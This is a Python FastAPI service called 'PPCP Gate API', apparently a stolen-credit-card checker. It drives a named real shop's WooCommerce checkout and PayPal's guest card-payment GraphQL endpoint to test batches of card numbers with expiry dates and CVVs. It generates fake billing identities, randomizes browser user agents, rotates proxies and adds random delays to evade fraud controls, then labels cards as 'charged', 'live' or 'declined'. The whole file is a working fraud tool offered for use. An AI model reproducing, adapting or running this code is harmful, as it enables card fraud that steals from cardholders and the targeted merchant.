# app.py
import os
import uuid
import string
import random
import asyncio
import time
import re
from typing import List, Optional
from urllib.parse import quote

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx
from faker import Faker

# Initialize Faker
fake = Faker()

# ---------------------------
# FastAPI App
# ---------------------------
app = FastAPI(title="PPCP Gate API", version="1.0.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---------------------------
# Configuration - CHANGE THESE FOR YOUR SITE
# ---------------------------
DOMAIN = "https://kbromberg.com"
PRODUCT_URL = "https://kbromberg.com/product/crashed-original-cover/"
PRODUCT_ID = "6999"

# ---------------------------
# Models
# ---------------------------
class CCRequest(BaseModel):
    cards: str

class CCResponse(BaseModel):
    card: str
    status: str
    message: str
    proxy_used: Optional[str] = None

# ---------------------------
# Helpers
# ---------------------------
def load_proxies(path="proxies.txt"):
    """Load proxies from file"""
    try:
        with open(path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def get_random_proxy_url(proxy_line: str) -> str:
    """Parse proxy line and return formatted proxy URL with random session"""
    parts = proxy_line.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        # Handle session randomization for rotating proxies
        if "session-" in user.lower():
            session_id = uuid.uuid4().hex[:16]
            # Replace any existing session ID pattern
            user = re.sub(r'session-[a-zA-Z0-9]+', f'session-{session_id}', user, flags=re.IGNORECASE)
        return f"http://{user}:{pwd}@{host}:{port}"
    return proxy_line

def generate_user_data():
    """Generate random user data for checkout"""
    first_names = ["Ahmed", "Mohamed", "Sarah", "Omar", "Layla", "Youssef", "Hannah", "Yara", "Khaled", 
                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha",
                   "John", "Jane", "Michael", "Emma", "David", "Sophia", "James", "Olivia", "Robert",
                   "William", "Richard", "Joseph", "Thomas", "Christopher", "Daniel", "Matthew"]
    
    last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez",
                  "Khalil", "Abdullah", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Kumar", "Davis",
                  "Miller", "Wilson", "Moore", "Taylor", "Anderson", "Thomas", "Jackson", "White"]
    
    cities_data = [
        ("New York", "NY", "10001"),
        ("Los Angeles", "CA", "90001"),
        ("Chicago", "IL", "60601"),
        ("Houston", "TX", "77001"),
        ("Phoenix", "AZ", "85001"),
        ("Philadelphia", "PA", "19101"),
        ("San Antonio", "TX", "78201"),
        ("San Diego", "CA", "92101"),
        ("Dallas", "TX", "75201"),
        ("San Jose", "CA", "95101"),
        ("Austin", "TX", "78701"),
        ("Denver", "CO", "80201"),
        ("Seattle", "WA", "98101"),
        ("Boston", "MA", "02101"),
        ("Miami", "FL", "33101")
    ]
    
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St",
               "Lincoln Ave", "Jefferson Blvd", "Madison Ave", "Franklin St", "Clinton Rd"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    city, state, zip_code = random.choice(cities_data)
    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
    phone = f"{random.choice(['212', '310', '312', '713', '602', '215', '210', '619', '214', '408'])}{random.randint(1000000, 9999999)}"
    email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}{random.randint(100, 9999)}@gmail.com"
    
    return {
        "first_name": first_name,
        "last_name": last_name,
        "city": city,
        "state": state,
        "zip_code": zip_code,
        "street": street,
        "phone": phone,
        "email": email
    }

def get_card_type(card_number: str) -> str:
    """Detect card type from number - PayPal format"""
    card = card_number.strip()
    
    if card.startswith('4'):
        return 'VISA'
    elif card.startswith(('51', '52', '53', '54', '55')) or card.startswith(('22', '23', '24', '25', '26', '27')):
        return 'MASTER_CARD'
    elif card.startswith(('34', '37')):
        return 'AMERICAN_EXPRESS'
    elif card.startswith(('6011', '65', '644', '645', '646', '647', '648', '649')):
        return 'DISCOVER'
    elif card.startswith('35'):
        return 'JCB'
    elif card.startswith(('36', '38', '300', '301', '302', '303', '304', '305')):
        return 'DINERS'
    elif card.startswith(('5018', '5020', '5038', '5893', '6304', '6759', '6761', '6762', '6763')):
        return 'MAESTRO'
    else:
        return 'VISA'

def build_form_encoded(user_data: dict, nonce: str) -> str:
    """Build the form_encoded string with proper URL encoding"""
    current_time = time.strftime('%Y-%m-%d+%H:%M:%S')
    user_agent_encoded = quote('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36')
    
    form_parts = [
        'wc_order_attribution_source_type=typein',
        'wc_order_attribution_referrer=(none)',
        'wc_order_attribution_utm_campaign=(none)',
        'wc_order_attribution_utm_source=(direct)',
        'wc_order_attribution_utm_medium=(none)',
        'wc_order_attribution_utm_content=(none)',
        'wc_order_attribution_utm_id=(none)',
        'wc_order_attribution_utm_term=(none)',
        'wc_order_attribution_utm_source_platform=(none)',
        'wc_order_attribution_utm_creative_format=(none)',
        'wc_order_attribution_utm_marketing_tactic=(none)',
        f'wc_order_attribution_session_entry={quote(DOMAIN + "/")}',
        f'wc_order_attribution_session_start_time={current_time}',
        'wc_order_attribution_session_pages=6',
        'wc_order_attribution_session_count=1',
        f'wc_order_attribution_user_agent={user_agent_encoded}',
        f'billing_first_name={user_data["first_name"]}',
        f'billing_last_name={user_data["last_name"]}',
        'billing_company=',
        'billing_country=US',
        f'billing_address_1={quote(user_data["street"])}',
        'billing_address_2=',
        f'billing_city={quote(user_data["city"])}',
        f'billing_state={user_data["state"]}',
        f'billing_postcode={user_data["zip_code"]}',
        f'billing_phone={user_data["phone"]}',
        f'billing_email={user_data["email"]}',
        'shipping_first_name=',
        'shipping_last_name=',
        'shipping_company=',
        'shipping_country=US',
        'shipping_address_1=',
        'shipping_address_2=',
        'shipping_postcode=',
        'shipping_city=',
        'shipping_state=',
        'order_comments=',
        'shipping_method[0]=flat_rate:10',
        'payment_method=ppcp-gateway',
        f'woocommerce-process-checkout-nonce={nonce}',
        '_wp_http_referer=' + quote('/?wc-ajax=update_order_review'),
        'ppcp-funding-source=card'
    ]
    
    return '&'.join(form_parts)

def parse_ppcp_result(result_text: str, card_info: str, proxy_url: str) -> dict:
    """Parse PayPal response and return structured result"""
    
    result_lower = result_text.lower() if result_text else ""
    
    # Success/Charge cases
    if any(x in result_text for x in ['ADD_SHIPPING_ERROR', 'Thank You', 'payment has already been processed']):
        return {
            "card": card_info,
            "status": "charged",
            "message": "Payment Charged Successfully!",
            "proxy_used": proxy_url
        }
    
    # 3D Secure / OTP Required
    if '"is3DSecureRequired":true' in result_text or 'threeDomainSecure' in result_text:
        return {
            "card": card_info,
            "status": "success",
            "message": "3D Secure/OTP Required",
            "proxy_used": proxy_url
        }
    
    # CCN Live (Invalid CVV but card exists)
    if 'INVALID_SECURITY_CODE' in result_text:
        return {
            "card": card_info,
            "status": "ccn_live",
            "message": "CCN Live (Wrong CVV)",
            "proxy_used": proxy_url
        }
    
    # Insufficient Funds - Card is LIVE
    if 'INSUFFICIENT_FUNDS' in result_text:
        return {
            "card": card_info,
            "status": "success",
            "message": "Insufficient Funds (Card Live)",
            "proxy_used": proxy_url
        }
    
    # Account Restricted - Card is LIVE
    if 'EXISTING_ACCOUNT_RESTRICTED' in result_text:
        return {
            "card": card_info,
            "status": "success",
            "message": "Account Restricted (Card Live)",
            "proxy_used": proxy_url
        }
    
    # Invalid Billing Address - Card is LIVE
    if 'INVALID_BILLING_ADDRESS' in result_text:
        return {
            "card": card_info,
            "status": "success",
            "message": "Invalid Billing Address (Card Live)",
            "proxy_used": proxy_url
        }
    
    # Card Generic Error / R_ERROR - DEAD
    if 'CARD_GENERIC_ERROR' in result_text or 'R_ERROR' in result_text:
        return {
            "card": card_info,
            "status": "declined",
            "message": "Card Declined (Generic Error)",
            "proxy_used": proxy_url
        }
    
    # Invalid Card Number
    if 'INVALID_CARD_NUMBER' in result_text:
        return {
            "card": card_info,
            "status": "declined",
            "message": "Invalid Card Number",
            "proxy_used": proxy_url
        }
    
    # Expired Card
    if 'EXPIRED_CARD' in result_text:
        return {
            "card": card_info,
            "status": "declined",
            "message": "Card Expired",
            "proxy_used": proxy_url
        }
    
    # Do Not Honor
    if 'DO_NOT_HONOR' in result_text:
        return {
            "card": card_info,
            "status": "declined",
            "message": "Do Not Honor",
            "proxy_used": proxy_url
        }
    
    # Card Closed
    if 'CARD_CLOSED' in result_text:
        return {
            "card": card_info,
            "status": "declined",
            "message": "Card Closed",
            "proxy_used": proxy_url
        }
    
    # Lost/Stolen Card
    if 'LOST_OR_STOLEN' in result_text or 'PICKUP_CARD' in result_text:
        return {
            "card": card_info,
            "status": "declined",
            "message": "Lost/Stolen Card",
            "proxy_used": proxy_url
        }
    
    # Transaction Not Permitted
    if 'TRANSACTION_NOT_PERMITTED' in result_text:
        return {
            "card": card_info,
            "status": "declined",
            "message": "Transaction Not Permitted",
            "proxy_used": proxy_url
        }
    
    # General Decline
    if any(x in result_text for x in ['DECLINED', 'DENIED', 'REJECTED']):
        return {
            "card": card_info,
            "status": "declined",
            "message": "Card Declined",
            "proxy_used": proxy_url
        }
    
    # Check for errors in response
    if '"errors"' in result_text:
        try:
            # Try to extract error message
            error_match = re.search(r'"message"\s*:\s*"([^"]+)"', result_text)
            if error_match:
                return {
                    "card": card_info,
                    "status": "declined",
                    "message": error_match.group(1)[:100],
                    "proxy_used": proxy_url
                }
        except:
            pass
    
    # Success with cart data (means payment went through)
    if '"cartId"' in result_text and '"accessToken"' in result_text:
        return {
            "card": card_info,
            "status": "charged",
            "message": "Payment Approved",
            "proxy_used": proxy_url
        }
    
    # Unknown response - return truncated response
    return {
        "card": card_info,
        "status": "unknown",
        "message": result_text[:150] if len(result_text) > 150 else result_text,
        "proxy_used": proxy_url
    }


# ---------------------------
# Async PPCP Functions
# ---------------------------
async def add_to_cart(session: httpx.AsyncClient, user_agent: str) -> bool:
    """Add product to cart"""
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': DOMAIN,
        'referer': PRODUCT_URL,
        'user-agent': user_agent,
    }
    
    data = {
        'quantity': '1',
        'add-to-cart': PRODUCT_ID,
    }
    
    response = await session.post(PRODUCT_URL, headers=headers, data=data)
    return response.status_code == 200


async def get_checkout_nonces(session: httpx.AsyncClient, user_agent: str) -> dict:
    """Get all required nonces from checkout page"""
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': f'{DOMAIN}/cart/',
        'user-agent': user_agent,
    }
    
    response = await session.get(f'{DOMAIN}/checkout/', headers=headers)
    html = response.text
    
    nonces = {}
    
    # Extract update_order_review nonce
    try:
        nonces['update_order_review'] = re.search(r'update_order_review_nonce":"(.*?)"', html).group(1)
    except:
        nonces['update_order_review'] = None
    
    # Extract save_checkout nonce
    try:
        nonces['save_checkout'] = re.search(r'save_checkout_form.*?nonce":"(.*?)"', html).group(1)
    except:
        try:
            nonces['save_checkout'] = re.search(r'"ppc-save-checkout-form.*?nonce":"(.*?)"', html).group(1)
        except:
            nonces['save_checkout'] = None
    
    # Extract process_checkout nonce
    try:
        nonces['process_checkout'] = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', html).group(1)
    except:
        nonces['process_checkout'] = None
    
    # Extract create_order nonce
    try:
        nonces['create_order'] = re.search(r'create_order.*?nonce":"(.*?)"', html).group(1)
    except:
        try:
            nonces['create_order'] = re.search(r'"ppc-create-order.*?nonce":"(.*?)"', html).group(1)
        except:
            nonces['create_order'] = None
    
    return nonces


async def update_order_review(session: httpx.AsyncClient, user_agent: str, nonces: dict, user_data: dict) -> bool:
    """Update order review with billing details"""
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': DOMAIN,
        'referer': f'{DOMAIN}/checkout/',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = (
        f'security={nonces["update_order_review"]}'
        f'&payment_method=ppcp-gateway'
        f'&country=US'
        f'&state={user_data["state"]}'
        f'&postcode={user_data["zip_code"]}'
        f'&city={user_data["city"]}'
        f'&address={quote(user_data["street"])}'
        f'&address_2='
        f'&s_country=US'
        f'&s_state={user_data["state"]}'
        f'&s_postcode={user_data["zip_code"]}'
        f'&s_city={user_data["city"]}'
        f'&s_address={quote(user_data["street"])}'
        f'&s_address_2='
        f'&has_full_address=true'
    )
    
    response = await session.post(f'{DOMAIN}/?wc-ajax=update_order_review', headers=headers, content=data)
    return response.status_code == 200


async def save_checkout_form(session: httpx.AsyncClient, user_agent: str, nonces: dict, user_data: dict) -> bool:
    """Save checkout form before creating order"""
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': DOMAIN,
        'referer': f'{DOMAIN}/checkout/',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    form_encoded = build_form_encoded(user_data, nonces['process_checkout'])
    
    json_data = {
        'nonce': nonces['save_checkout'],
        'form_encoded': form_encoded,
    }
    
    response = await session.post(
        f'{DOMAIN}/',
        params={'wc-ajax': 'ppc-save-checkout-form'},
        headers=headers,
        json=json_data
    )
    return response.status_code == 200


async def create_ppcp_order(session: httpx.AsyncClient, user_agent: str, nonces: dict, user_data: dict) -> Optional[str]:
    """Create PayPal order and return order ID"""
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': DOMAIN,
        'referer': f'{DOMAIN}/checkout/',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    form_encoded = build_form_encoded(user_data, nonces['process_checkout'])
    
    json_data = {
        'nonce': nonces['create_order'],
        'payer': None,
        'bn_code': 'Woo_PPCP',
        'context': 'checkout',
        'order_id': '0',
        'payment_method': 'ppcp-gateway',
        'funding_source': 'card',
        'form_encoded': form_encoded,
        'createaccount': False,
        'save_payment_method': False,
    }
    
    response = await session.post(
        f'{DOMAIN}/',
        params={'wc-ajax': 'ppc-create-order'},
        headers=headers,
        json=json_data
    )
    
    try:
        data = response.json()
        if data.get('success') and data.get('data', {}).get('id'):
            return data['data']['id']
        return None
    except:
        return None


async def process_card_payment(user_agent: str, order_id: str, card: str, month: str, year: str, cvv: str, user_data: dict) -> str:
    """Process card payment via PayPal GraphQL - Direct to PayPal (no proxy needed)"""
    
    # Format expiration
    if len(month) == 1:
        month = f'0{month}'
    if len(year) == 4:
        year = year[2:]  # Convert 2025 to 25
    elif '20' in year and len(year) > 2:
        year = year.replace('20', '')
    
    card_type = get_card_type(card)
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.paypal.com',
        'referer': 'https://www.paypal.com/',
        'user-agent': user_agent,
    }
    
    graphql_query = '''
    mutation payWithCard(
        $token: String!
        $card: CardInput!
        $phoneNumber: String
        $firstName: String
        $lastName: String
        $shippingAddress: AddressInput
        $billingAddress: AddressInput
        $email: String
        $currencyConversionType: CheckoutCurrencyConversionType
        $installmentTerm: Int
        $identityDocument: IdentityDocumentInput
    ) {
        approveGuestPaymentWithCreditCard(
            token: $token
            card: $card
            phoneNumber: $phoneNumber
            firstName: $firstName
            lastName: $lastName
            email: $email
            shippingAddress: $shippingAddress
            billingAddress: $billingAddress
            currencyConversionType: $currencyConversionType
            installmentTerm: $installmentTerm
            identityDocument: $identityDocument
        ) {
            flags {
                is3DSecureRequired
            }
            cart {
                intent
                cartId
                buyer {
                    userId
                    auth {
                        accessToken
                    }
                }
                returnUrl {
                    href
                }
            }
            paymentContingencies {
                threeDomainSecure {
                    status
                    method
                    redirectUrl {
                        href
                    }
                    parameter
                }
            }
        }
    }
    '''
    
    json_data = {
        'query': graphql_query,
        'variables': {
            'token': order_id,
            'card': {
                'cardNumber': card,
                'type': card_type,
                'expirationDate': f'{month}/20{year}',
                'postalCode': user_data['zip_code'],
                'securityCode': cvv,
            },
            'firstName': user_data['first_name'],
            'lastName': user_data['last_name'],
            'billingAddress': {
                'givenName': user_data['first_name'],
                'familyName': user_data['last_name'],
                'line1': user_data['street'],
                'line2': None,
                'city': user_data['city'],
                'state': user_data['state'],
                'postalCode': user_data['zip_code'],
                'country': 'US',
            },
            'email': user_data['email'],
            'currencyConversionType': 'VENDOR',
        },
    }
    
    # PayPal GraphQL call - Direct connection (no proxy)
    async with httpx.AsyncClient(timeout=httpx.Timeout(30.0), verify=True) as paypal_client:
        response = await paypal_client.post(
            'https://www.paypal.com/graphql?ApproveGuestPaymentWithCreditCard',
            headers=headers,
            json=json_data
        )
        return response.text


# ---------------------------
# Core Payment Function
# ---------------------------
async def check_card_ppcp(fullz: str, proxy_url: str) -> dict:
    """Main function to check a card via PPCP"""
    card_info = fullz.strip()
    
    try:
        parts = fullz.strip().split('|')
        if len(parts) < 4:
            return {
                "card": card_info,
                "status": "error",
                "message": "Invalid format. Use: cc|mm|yy|cvv",
                "proxy_used": proxy_url
            }
        
        card = parts[0].strip()
        month = parts[1].strip()
        year = parts[2].strip()
        cvv = parts[3].strip()
        card_info = f"{card}|{month}|{year}|{cvv}"
        
        # Validate card number (basic check)
        if not card.isdigit() or len(card) < 13:
            return {
                "card": card_info,
                "status": "error",
                "message": "Invalid card number",
                "proxy_used": proxy_url
            }
        
        # Generate user data and user agent
        user_data = generate_user_data()
        user_agent = fake.user_agent()
        
        # Setup proxy
        proxies = None
        if proxy_url:
            proxies = {
                "http://": proxy_url,
                "https://": proxy_url
            }
        
        # Create session with proxy
        async with httpx.AsyncClient(
            proxies=proxies,
            timeout=httpx.Timeout(60.0),
            follow_redirects=True,
            verify=False
        ) as session:
            
            # Step 1: Add to cart
            await asyncio.sleep(random.uniform(0.3, 0.8))
            cart_result = await add_to_cart(session, user_agent)
            if not cart_result:
                return {
                    "card": card_info,
                    "status": "error",
                    "message": "Failed to add to cart",
                    "proxy_used": proxy_url
                }
            
            # Step 2: Get checkout nonces
            await asyncio.sleep(random.uniform(0.3, 0.8))
            nonces = await get_checkout_nonces(session, user_agent)
            
            if not nonces.get('create_order') or not nonces.get('save_checkout'):
                return {
                    "card": card_info,
                    "status": "error",
                    "message": "Failed to get checkout nonces",
                    "proxy_used": proxy_url
                }
            
            # Step 3: Update order review
            await asyncio.sleep(random.uniform(0.3, 0.8))
            await update_order_review(session, user_agent, nonces, user_data)
            
            # Step 4: Save checkout form
            await asyncio.sleep(random.uniform(0.3, 0.8))
            await save_checkout_form(session, user_agent, nonces, user_data)
            
            # Step 5: Create PPCP order
            await asyncio.sleep(random.uniform(0.3, 0.8))
            order_id = await create_ppcp_order(session, user_agent, nonces, user_data)
            
            if not order_id:
                return {
                    "card": card_info,
                    "status": "error",
                    "message": "Failed to create PayPal order",
                    "proxy_used": proxy_url
                }
            
            # Step 6: Process card payment via PayPal GraphQL
            await asyncio.sleep(random.uniform(0.3, 0.8))
            result = await process_card_payment(user_agent, order_id, card, month, year, cvv, user_data)
            
            # Parse and return result
            return parse_ppcp_result(result, card_info, proxy_url)
    
    except httpx.TimeoutException:
        return {
            "card": card_info,
            "status": "error",
            "message": "Request timeout",
            "proxy_used": proxy_url
        }
    except httpx.ProxyError as e:
        return {
            "card": card_info,
            "status": "error",
            "message": f"Proxy error: {str(e)[:50]}",
            "proxy_used": proxy_url
        }
    except Exception as e:
        return {
            "card": card_info,
            "status": "error",
            "message": str(e)[:100],
            "proxy_used": proxy_url
        }


# ---------------------------
# API ENDPOINTS
# ---------------------------
@app.get("/")
async def root():
    return {
        "message": "PPCP Gate API is running",
        "version": "1.0.0",
        "endpoints": {
            "GET": "/ccngate/{cards}",
            "POST": "/ccngate"
        },
        "format": "cc|mm|yy|cvv",
        "example": "/ccngate/4111111111111111|12|25|123"
    }


@app.get("/ccngate/{cards}", response_model=List[CCResponse])
async def check_cards_get(cards: str):
    """
    Check cards via GET request
    Format: cc|mm|yy|cvv,cc|mm|yy|cvv,...
    Max 5 cards per request
    """
    card_list = [c.strip() for c in cards.split(",") if c.strip()][:5]
    
    if not card_list:
        raise HTTPException(status_code=400, detail="No valid cards provided")
    
    # Load and select proxy
    proxies = load_proxies()
    proxy_url = None
    if proxies:
        proxy_line = random.choice(proxies)
        proxy_url = get_random_proxy_url(proxy_line)
    
    results = []
    for card in card_list:
        res = await check_card_ppcp(card, proxy_url)
        results.append(res)
        # Small delay between cards
        if len(card_list) > 1:
            await asyncio.sleep(random.uniform(1, 2))
    
    return results


@app.post("/ccngate", response_model=List[CCResponse])
async def check_cards_post(request: CCRequest):
    """
    Check cards via POST request
    Body: {"cards": "cc|mm|yy|cvv,cc|mm|yy|cvv,..."}
    Max 5 cards per request
    """
    card_list = [c.strip() for c in request.cards.split(",") if c.strip()][:5]
    
    if not card_list:
        raise HTTPException(status_code=400, detail="No valid cards provided")
    
    # Load and select proxy
    proxies = load_proxies()
    proxy_url = None
    if proxies:
        proxy_line = random.choice(proxies)
        proxy_url = get_random_proxy_url(proxy_line)
    
    results = []
    for card in card_list:
        res = await check_card_ppcp(card, proxy_url)
        results.append(res)
        # Small delay between cards
        if len(card_list) > 1:
            await asyncio.sleep(random.uniform(1, 2))
    
    return results


# Health check endpoint
@app.get("/health")
async def health_check():
    return {"status": "healthy", "gateway": "PPCP"}


# ---------------------------
# RUN
# ---------------------------
if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
